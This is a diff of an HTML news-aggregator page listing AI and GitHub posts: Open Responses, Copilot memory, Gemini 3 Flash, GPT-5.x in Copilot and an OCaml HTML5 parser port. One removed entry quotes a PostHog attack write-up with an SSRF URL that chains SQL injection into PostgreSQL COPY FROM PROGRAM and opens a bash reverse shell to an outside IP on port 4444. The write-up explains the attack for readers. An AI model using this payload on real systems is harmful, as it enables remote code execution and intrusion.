@@ -31,6 +31,53 @@
       <article>
           <details>
             <summary>
+              Open Responses
+              <span class="post-metadata">(3 min | 932 words)</span> 
+            </summary>
+            <div class="post-content">
+              <a target="_blank" href=https://simonwillison.net/2026/Jan/15/open-responses/#atom-everything>Open Responses
+Open Responses aims to provide exactly that as a documented standard, derived from OpenAI&#x27;s Responses API.
+I was hoping for one based on their older Chat Completions API since so many other products have cloned the already, but basing it on Responses does make sense since that API was designed with the feature of more recent models - such as reasoning traces - baked into the design.
+What&#x27;s certainly notable is the list of launch partners. OpenRouter alone means we can expect to be able to use this protocol with almost every existing model, and Hugging Face, LM Studio, vLLM, Ollama and Vercel cover a huge portion of the common tools used to serve models.
+For protocols like this I really want to see a comprehensive, language-independent conformance test site. Open Responses has a subset of that - the official repository includes src/lib/compliance-tests.ts which can be used to exercise a server implementation, and is available as a React app on the official site that can be pointed at any implementation served via CORS.
+What&#x27;s missing is the equivalent for clients. I plan to spin up my own client library for this in Python and I&#x27;d really like to be able to run that against a conformance suite designed to check that my client correctly handles all of the details.
+
+    
+Via VB
+Tags: json, standards, ai, openai, generative-ai, llms, openrouter, conformance-suites</a>
+            </div>
+            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
+          </details>
+      </article>
+      <article>
+          <details>
+            <summary>
+              Secret scanning extended metadata to be automatically enabled for certain repositories
+              <span class="post-metadata">(5 min | 1555 words)</span> 
+            </summary>
+            <div class="post-content">
+              <a target="_blank" href=https://github.blog/changelog/2026-01-15-secret-scanning-extended-metadata-to-be-automatically-enabled-for-certain-repositories>GitHub secret scanning is adding support for extended metadata checks in security configurations, starting February 18, 2026. Extended metadata checks are a nested feature under validity checks. If you’ve already…
+The post Secret scanning extended metadata to be automatically enabled for certain repositories appeared first on The GitHub Blog.</a>
+            </div>
+            <!-- <p class="post-source">Archive: 2026 - GitHub Changelog</p> -->
+          </details>
+      </article>
+      <article>
+          <details>
+            <summary>
+              Agentic memory for GitHub Copilot is in public preview
+              <span class="post-metadata">(5 min | 1429 words)</span> 
+            </summary>
+            <div class="post-content">
+              <a target="_blank" href=https://github.blog/changelog/2026-01-15-agentic-memory-for-github-copilot-is-in-public-preview>Copilot memory is now available in public preview for all paid GitHub Copilot plans. Copilot memory enables Copilot to learn and retain useful details about your repositories. As you work…
+The post Agentic memory for GitHub Copilot is in public preview appeared first on The GitHub Blog.</a>
+            </div>
+            <!-- <p class="post-source">Archive: 2026 - GitHub Changelog</p> -->
+          </details>
+      </article>
+      <article>
+          <details>
+            <summary>
               Hierarchy view now available in GitHub Projects
               <span class="post-metadata">(6 min | 1671 words)</span> 
             </summary>
@@ -3605,297 +3652,6 @@ The post Enterprise-level pull request activity now included in Copilot Usage Me
               <a target="_blank" href=https://ollama.com/library/functiongemma>FunctionGemma is a specialized version of Google&#x27;s Gemma 3 270M model fine-tuned explicitly for function calling.</a>
             </div>
             <!-- <p class="post-source">Ollama models</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain
-              <span class="post-metadata">(2 min | 698 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/#atom-everything>Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain
-The way in abuses a webhooks system with non-robust URL validation, setting up a SSRF (Server-Side Request Forgery) attack where the server makes a request against an internal network resource.
-Here&#x27;s the URL that gets injected:
-http://clickhouse:8123/?query&#x3D;SELECT++FROM+postgresql(&#x27;db:5432&#x27;,&#x27;posthog&#x27;,\&quot;posthog_use&#x27;))+TO+STDOUT;END;DROP+TABLE+IF+EXISTS+cmd_exec;CREATE+TABLE+cmd_exec(cmd_output+text);COPY+cmd_exec+FROM+PROGRAM+$$bash+-c+\\&quot;bash+-i+&gt;%26+/dev/tcp/172.31.221.180/4444+0&gt;%261\\&quot;$$;SELECT++FROM+cmd_exec;+--\&quot;,&#x27;posthog&#x27;,&#x27;posthog&#x27;)#
-Reformatted a little for readability:
-http://clickhouse:8123/?query&#x3D;
-SELECT *
-FROM postgresql(
-    &#x27;db:5432&#x27;,
-    &#x27;posthog&#x27;,
-    &quot;posthog_use&#x27;)) TO STDOUT;
-    END;
-    DROP TABLE IF EXISTS cmd_exec;
-    CREATE TABLE cmd_exec (
-        cmd_output text
-    );
-    COPY cmd_exec
-    FROM PROGRAM $$
-        bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.31.221.180/4444 0&gt;&amp;1\&quot;
-    $$;
-    SELECT * FROM cmd_exec;
-    --&quot;,
-    &#x27;posthog&#x27;,
-    &#x27;posthog&#x27;
-)
-#
-
-This abuses ClickHouse&#x27;s ability to run its own queries against PostgreSQL using the postgresql() table function, combined with an escaping bug in ClickHouse PostgreSQL function (since fixed). Then that query abuses PostgreSQL&#x27;s ability to run shell commands via COPY ... FROM PROGRAM.
-The bash -c bit is particularly nasty - it opens a reverse shell such that an attacker with a machine at that IP address listening on port 4444 will receive a connection from the PostgreSQL server that can then be used to execute arbitrary commands.
-
-    
-Via Hacker News
-Tags: postgresql, security, webhooks, clickhouse</a>
-            </div>
-            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-
-      </section>
-    </li>
-    <li>
-      <time>2025-12-17</time>
-
-      <section>
-      <article>
-          <details>
-            <summary>
-              AoAH Day 15: Porting a complete HTML5 parser and browser test suite
-              <span class="post-metadata">(2 min | 747 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://simonwillison.net/2025/Dec/17/vibespiling/#atom-everything>AoAH Day 15: Porting a complete HTML5 parser and browser test suite
-Advent of Agentic Humps this year, building a new useful OCaml library every day for most of December.
-Inspired by Emil Stenström&#x27;s JustHTML and my own coding agent port of that to JavaScript he coined the term vibespiling for AI-powered porting and transpiling of code from one language to another and had a go at building an HTML5 parser in OCaml, resulting in html5rw which passes the same html5lib-tests suite that Emil and myself used for our projects.
-Anil&#x27;s thoughts on the copyright and ethical aspects of this are worth quoting in full:
-The question of copyright and licensing is difficult. I definitely did some editing by hand, and a fair bit of prompting that resulted in targeted code edits, but the vast amount of architectural logic came from JustHTML. So I opted to make the LICENSE a joint one with Emil Stenström. I did not follow the transitive dependency through to the Rust one, which I probably should.
-I&#x27;m also extremely uncertain about every releasing this library to the central opam repository, especially as there are excellent HTML5 parsers already available. I haven&#x27;t checked if those pass the HTML5 test suite, because this is wandering into the agents vs humans territory that I ruled out in my groundrules. Whether or not this agentic code is better or not is a moot point if releasing it drives away the human maintainers who are the source of creativity in the code!
-I decided to credit Emil in the same way for my own vibespiled project.
-
-    
-Via @avsm
-Tags: definitions, functional-programming, ai, generative-ai, llms, ai-assisted-programming, ai-ethics, vibe-coding, ocaml</a>
-            </div>
-            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Gemini 3 Flash
-              <span class="post-metadata">(5 min | 1470 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://simonwillison.net/2025/Dec/17/gemini-3-flash/#atom-everything>It continues to be a busy December, if not quite as busy as last year. Today&#x27;s big news is Gemini 3 Flash, the latest in Google&#x27;s &quot;Flash&quot; line of faster and less expensive models.
-
-Google are emphasizing the comparison between the new Flash and their previous generation&#x27;s top model Gemini 2.5 Pro:
-
-
-Building on 3 Pro’s strong multimodal, coding and agentic features, 3 Flash offers powerful performance at less than a quarter the cost of 3 Pro, along with higher rate limits. The new 3 Flash model surpasses 2.5 Pro across many benchmarks while delivering faster speeds.
-
-
-Gemini 3 Flash&#x27;s characteristics are almost identical to Gemini 3 Pro: it accepts text, image, video, audio, and PDF, outputs only text, handles 1,048,576 maximum input tokens and up to 65,536 output tokens, and has the same knowledge cut-off date of January 2025 (also shared with the Gemini 2.5 series).
-
-The benchmarks look good. The cost is appealing: 1/4 the price of Gemini 3 Pro ≤200k and 1/8 the price of Gemini 3 Pro &gt;200k, and it&#x27;s nice not to have a price increase for the new Flash at larger token lengths.
-
-It&#x27;s a little more expensive than previous Flash models - Gemini 2.5 Flash was $0.30/million input tokens and $2.50/million on output, Gemini 3 Flash is $0.50/million and $3/million respectively.
-
-Here&#x27;s a more extensive price comparison on my llm-prices.com site.
-
-Generating some SVGs of pelicans
-
-I released llm-gemini 0.28 this morning with support for the new model. You can try it out like this:
-
-llm install -U llm-gemini
-llm keys set gemini # paste in key
-llm -m gemini-3-flash-preview &quot;Generate an SVG of a pelican riding a bicycle&quot;
-
-
-According to the developer docs the new model supports four different thinking level options: minimal, low, medium, and high. This is different from Gemini 3 Pro, which only supported low and high.
-
-You can run those like this:
-
-llm -m gemini-3-flash-preview --thinking-level minimal &quot;Generate an SVG of a pelican riding a bicycle&quot;
-
-
-Here are four pelicans, for thinking levels minimal, low, medium, and high:
-
-
-    
-    
-    
-    
-
-I built the gallery component with Gemini 3 Flash
-
-The gallery above uses a new Web Component which I built using Gemini 3 Flash to try out its coding abilities. The code on the page looks like this:
-
-
-&lt;image-gallery width&#x3D;&quot;4&quot;&gt;
-    &lt;img src&#x3D;&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-minimal-pelican-svg.jpg&quot; alt&#x3D;&quot;A minimalist vector illustration of a stylized white bird with a long orange beak and a red cap riding a dark blue bicycle on a single grey ground line against a plain white background.&quot; /&gt;
-    &lt;img src&#x3D;&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-low-pelican-svg.jpg&quot; alt&#x3D;&quot;Minimalist illustration: A stylized white bird with a large, wedge-shaped orange beak and a single black dot for an eye rides a red bicycle with black wheels and a yellow pedal against a solid light blue background.&quot; /&gt;
-    &lt;img src&#x3D;&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-medium-pelican-svg.jpg&quot; alt&#x3D;&quot;A minimalist illustration of a stylized white bird with a large yellow beak riding a red road bicycle in a racing position on a light blue background.&quot; /&gt;
-    &lt;img src&#x3D;&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg&quot; alt&#x3D;&quot;Minimalist line-art illustration of a stylized white bird with a large orange beak riding a simple black bicycle with one orange pedal, centered against a light blue circular background.&quot; /&gt;
-&lt;/image-gallery&gt;
-
-Those alt attributes are all generated by Gemini 3 Flash as well, using this recipe:
-
-
-llm -m gemini-3-flash-preview --system &#x27;
-You write alt text for any image pasted in by the user. Alt text is always presented in a
-fenced code block to make it easy to copy and paste out. It is always presented on a single
-line so it can be used easily in Markdown images. All text on the image (for screenshots etc)
-must be exactly included. A short note describing the nature of the image itself should go first.&#x27; \
--a https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg
-
-You can see the code that powers the image gallery Web Component here on GitHub. I built it by prompting Gemini 3 Flash via LLM like this:
-
-
-llm -m gemini-3-flash-preview &#x27;
-Build a Web Component that implements a simple image gallery. Usage is like this:
-
-&lt;image-gallery width&#x3D;&quot;5&quot;&gt;
-  &lt;img src&#x3D;&quot;image1.jpg&quot; alt&#x3D;&quot;Image 1&quot;&gt;
-  &lt;img src&#x3D;&quot;image2.jpg&quot; alt&#x3D;&quot;Image 2&quot; data-thumb&#x3D;&quot;image2-thumb.jpg&quot;&gt;
-  &lt;img src&#x3D;&quot;image3.jpg&quot; alt&#x3D;&quot;Image 3&quot;&gt;
-&lt;/image-gallery&gt;
-
-If an image has a data-thumb&#x3D; attribute that one is used instead, other images are scaled down. 
-
-The image gallery always takes up 100% of available width. The width&#x3D;&quot;5&quot; attribute means that five images will be shown next to each other in each row. The default is 3. There are gaps between the images. When an image is clicked it opens a modal dialog with the full size image.
-
-Return a complete HTML file with both the implementation of the Web Component several example uses of it. Use https://picsum.photos/300/200 URLs for those example images.&#x27;
-
-It took a few follow-up prompts using llm -c:
-
-
-llm -c &#x27;Use a real modal such that keyboard shortcuts and accessibility features work without extra JS&#x27;
-
-llm -c &#x27;Use X for the close icon and make it a bit more subtle&#x27;
-
-llm -c &#x27;remove the hover effect entirely&#x27;
-
-llm -c &#x27;I want no border on the close icon even when it is focused&#x27;
-
-Here&#x27;s the full transcript, exported using llm logs -cue.
-
-Those five prompts took:
-
-
-225 input, 3,269 output
-
-2,243 input, 2,908 output
-
-4,319 input, 2,516 output
-
-6,376 input, 2,094 output
-
-8,151 input, 1,806 output
-
-
-Added together that&#x27;s 21,314 input and 12,593 output for a grand total of 4.8436 cents.
-
-The guide to migrating from Gemini 2.5 reveals one disappointment:
-
-
-Image segmentation: Image segmentation capabilities (returning pixel-level masks for objects) are not supported in Gemini 3 Pro or Gemini 3 Flash. For workloads requiring native image segmentation, we recommend continuing to utilize Gemini 2.5 Flash with thinking turned off or Gemini Robotics-ER 1.5.
-
-
-I wrote about this capability in Gemini 2.5 back in April. I hope they come back in future models - they&#x27;re a really neat capability that is unique to Gemini.
-Tags: google, ai, web-components, generative-ai, llms, llm, gemini, llm-pricing, pelican-riding-a-bicycle, llm-release</a>
-            </div>
-            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              gemini-3-flash-preview
-              <span class="post-metadata">(7 min | 2244 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://ollama.com/library/gemini-3-flash-preview>Gemini 3 Flash offers frontier intelligence built for speed at a fraction of the cost.</a>
-            </div>
-            <!-- <p class="post-source">Ollama models</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              GPT-5.2 is now generally available in GitHub Copilot
-              <span class="post-metadata">(5 min | 1377 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-12-17-gpt-5-2-is-now-generally-available-in-github-copilot>GPT-5.2 is generally available to Copilot Enterprise, Copilot Business, Copilot Pro, and Copilot Pro+. You’ll now be able to access the model in GitHub Copilot Chat on github.com, GitHub Mobile,…
-The post GPT-5.2 is now generally available in GitHub Copilot appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2026 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              GPT-5.1-Codex-Max is now generally available in GitHub Copilot
-              <span class="post-metadata">(5 min | 1378 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-12-17-gpt-5-1-codex-max-is-now-generally-available-in-github-copilot>GPT-5.1-Codex-Max is generally available to Copilot Enterprise, Copilot Business, Copilot Pro, and Copilot Pro+. You’ll now be able to access the model in GitHub Copilot Chat on github.com, GitHub Mobile,…
-The post GPT-5.1-Codex-Max is now generally available in GitHub Copilot appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2026 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              GPT-5.1 and GPT-5.1-Codex are now generally available in GitHub Copilot
-              <span class="post-metadata">(5 min | 1390 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-12-17-gpt-5-1-and-gpt-5-1-codex-are-now-generally-available-in-github-copilot>GPT-5.1 and GPT-5.1-Codex are generally available to Copilot Enterprise, Copilot Business, Copilot Pro, and Copilot Pro+. You’ll now be able to access the model in GitHub Copilot Chat on github.com,…
-The post GPT-5.1 and GPT-5.1-Codex are now generally available in GitHub Copilot appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2026 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Copilot code review now available for organization members without a license
-              <span class="post-metadata">(6 min | 1713 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-12-17-copilot-code-review-now-available-for-organization-members-without-a-license>Organizations can now apply Copilot code review to all pull requests, including those from contributors without a Copilot license. Usage is billed seamlessly to the organization as premium requests, without…
-The post Copilot code review now available for organization members without a license appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2026 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Dynamic Copilot prompts on GitHub Docs
-              <span class="post-metadata">(4 min | 1297 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-12-17-dynamic-copilot-prompts-on-github-docs>You can now launch GitHub Copilot prompts directly from select pages on GitHub Docs. We’ve introduced dynamic GitHub Copilot prompts, making it easy to move seamlessly from documentation to Copilot…
-The post Dynamic Copilot prompts on GitHub Docs appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2026 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Gemini 3 Flash is now in public preview for GitHub Copilot
-              <span class="post-metadata">(5 min | 1464 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-12-17-gemini-3-flash-is-now-in-public-preview-for-github-copilot>Gemini 3 Flash, ideal for tasks where speed is crucial, is now rolling out in public preview in GitHub Copilot. Availability in GitHub Copilot Gemini 3 Flash is now rolling…
-The post Gemini 3 Flash is now in public preview for GitHub Copilot appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2026 - GitHub Changelog</p> -->
           </details>
       </article>
 
